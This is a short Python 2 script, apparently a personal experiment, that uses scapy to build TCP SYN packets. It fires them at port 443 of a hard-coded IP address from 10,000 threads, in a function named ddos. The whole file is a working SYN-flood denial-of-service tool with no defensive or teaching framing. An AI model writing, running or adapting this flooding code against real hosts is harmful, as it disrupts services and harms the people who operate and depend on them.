#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
Created on Mon Oct  8 15:11:06 2018

@author: aayushbhargava
"""
import threading
from multiprocessing import Process

import time
from scapy.all import *
#from scapy import IP
#a=IP(ttl=10)
#IP()
target="xyzzy.com"
'''
a=IP(ttl=64)
print str(a.show())
ip=IP(dst=target)
for x in ip:
    print x.show()
print ip.show()
,chksum=packet[TCP].chksum
chksum=0xcdf5,
random.randint(1,101)
'''
def ddos():
    tcp = TCP(flags='S',sport=random.randint(49152,65535),dport=443,window=65535,dataofs=11,options=[('MSS', 1460), ('NOP', None), ('WScale', 5), ('NOP', None), ('NOP', None), ('Timestamp', (int(time.time()), 0)), ('SAckOK', ''), ('EOL', None)])
    ip = IP(len=64,ihl=5,flags='DF',dst='192.237.154.216',id=0)
    a=Ether()/ip/tcp
    sendp(a)
    for x in a:
        print x.show2()
    hexdump(a)
#
#sportx = [51791,51792,51793]
for i in range(10000):
    c="THDy"+str(i)
    c= threading.Thread(target=ddos)
    c.start()
    print(str(c))
#    if i==1:
#        time.sleep(10)
#c=Ether(raw(a))
#print c.show()